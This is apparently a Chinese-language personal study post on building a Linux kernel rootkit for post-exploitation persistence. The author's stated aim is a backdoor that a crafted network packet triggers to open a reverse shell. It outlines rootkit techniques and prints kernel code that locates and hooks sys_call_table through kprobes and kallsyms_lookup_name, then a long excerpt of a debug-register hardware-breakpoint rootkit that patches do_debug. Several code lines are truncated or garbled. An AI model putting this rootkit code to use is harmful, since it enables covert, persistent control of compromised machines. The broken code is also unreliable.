假期看了下linux rootkit的资料，想⾃⼰实现⼀个来着，整理了⼀些参考资料和代码。我的想法是rootkit主要作为
后渗透维权的⼀种⽅式，能主要⽤于隐蔽⾃⼰以及能够⽅便触发，想实现的功能也很简单，就是类似发送⼀个特定
的tcp/udp/icmp包就能触发后⻔，反弹⼀个shell或者返回⼀段加密的内容。
⼀些历史
1. 先是 LD_PRELOAD ，⽤户态，使⽤劫持动态链接库的⼿段可以⽅便hook⼀些函数以达到隐藏的⽬的。
2. Kernel Module ，即编译linux内核，修改⾥⾯的代码达到⽬的，但编译内核不太现实，linux提供了⼀个插
件化的⽅式，通过编译⼀个 .ko ⽂件动态加载⾃定义的内核功能，在内核态，就是操作系统的神，⼲什么事
情都会经过你。我也主要是学习的这种⽅式。
3. 通过操作 /dev/mem  内核内存的⽅式注⼊代码
4. 16年blackhat上的议题，通过在系统启动时插⼊⼀个命名空间(类似docker的隔离环境)
1. https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-
Rootkit.pdf
Hook
rootkit就是对操作系统内核的函数进⾏hook，从⽽在⼀些关键函数上执⾏⾃⼰的命令。
分为两种hook，⼀种是对系统调⽤(syscall)进⾏hook，⼀种是对内核的⼀些导出函数进⾏hook。
系统调⽤表:https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl 系统调⽤参
考：https://syscalls64.paolostivanin.com/
hook内核导出函数实际上就是通过 kallsyms_lookup_name 获取导出函数地址，把它换成我们⾃定义的。
对系统调⽤syscall的hook实际上就是获取 sys_call_table 的导出函数，对这个表⾥的地址hook。
在linux内核版本 5.7.0 以上，取消了 kallsyms_lookup_name 的导出。但还可以使⽤ KPROBE 定位到函数地址
// for linux kernal hook when version >= 5.7.0
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include 
static struct kprobe kp = {
      .symbol_name = "kallsyms_lookup_name"
};
#endif
unsigned long * get_syscall_table_bf(void)
{
  unsigned long *syscall_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;
  register_kprobe(&kp);
  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
在看canvas的linux rootkit时，它是⽤硬件断点在syscall table下断点，当执⾏到的时候，再修改地址。
贴⼀下代码参考
  unregister_kprobe(&kp);
#endif
  syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
  return syscall_table;
#else
  unsigned long int i;
  for (i = (unsigned long int)sys_close; i 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#if LINUX_VERSION_CODE 
#else
    #include 
#endif
#define __SYSENTER_ENABLE__
//#define __UNLINK_LKM__
/* define this if you want (very) verbose kern logs */
/*#define __DEBUG__*/
#ifdef __DEBUG__
    #define DEBUGLOG(a) printk a
#else
    #define DEBUGLOG(a) ""
#endif
/* hooks live here - has sys_table_global */
#include "hooktable.h"
/*
    __get_int_handler(int offset)
    in:     interrupt # as an offset
    out:    address of interrupt handler
*/
static int __get_int_handler(int offset)
{
    int idt_entry   = 0;
                            /* off2 dr0)
        __asm__ __volatile__ (  "movl %0,%%dr0   \n\t" 
                                : 
                                : "r" (watches->dr0)    );
    if (watches->dr1)
        __asm__ __volatile__ (  "movl %0,%%dr1   \n\t"
                                :
                                : "r" (watches->dr1)    );
    if (watches->dr2)
        __asm__ __volatile__ (  "movl %0,%%dr2   \n\t"
                                :
                                : "r" (watches->dr2)    );
    if (watches->dr3)
        __asm__ __volatile__ (  "movl %0,%%dr2   \n\t"
                                :
                                : "r" (watches->dr3)    );
    /* set status */
    if (watches->stat)
        __asm__ __volatile__ (  "movl %0,%%dr6   \n\t"
                                :
                                : "r" (watches->stat)   );
    /* set ctrl */
    if (watches->ctrl)
        __asm__ __volatile__ (  "movl %0,%%dr7  \n\t"
                                :
                                : "r" (watches->ctrl)   );
}
/*
    The patched do_debug handler
    original lives at: ./arch/i386/kernel/traps.c:do_debug
    NOTE:
    This is where we would handle access to the debug regs
    for full stealth .. considering this is intended as a
    penetration testing rootkit .. I've not included this.
entry.S - 2.6:
KPROBE_ENTRY(debug)
        RING0_INT_FRAME
        cmpl $sysenter_entry,(%esp)     >  8;
    p[3]    = (offset & 0x00ff0000) >> 16;
    p[4]    = (offset & 0xff000000) >> 24;
    DEBUGLOG(("*** patched in new do_debug offset\n"));
    return orig;
}
void (*__orig_do_debug)(struct pt_regs * regs, unsigned long error_code)
;
/* regs in eax, error_code in edx .. static reg optimized is fine */
static void __my_do_debug(struct pt_regs * regs, 
                unsigned long error_code)
{
    struct task_struct *tsk = current;
    siginfo_t info;
    int trap            = -1;
    int control         = 0;
    int s_control       = 0;
    int status          = 0;
    unsigned int dr2    = 0;
    void **sys_p        = (void **)sys_table_global;
    /* get dr6 */
    __asm__ __volatile__ (  "movl %%dr6,%0   \n\t"
                            : "=r" (status)  );
    /* enable irqs ? if (regs->eflags & X86_EFLAGS_IF) */
    /* check for trap on dr0 */
    if (status & DR_TRAP0)
    {
        trap = 0;
        status &= ~DR_TRAP0;
    }
    /* check for trap on dr1 */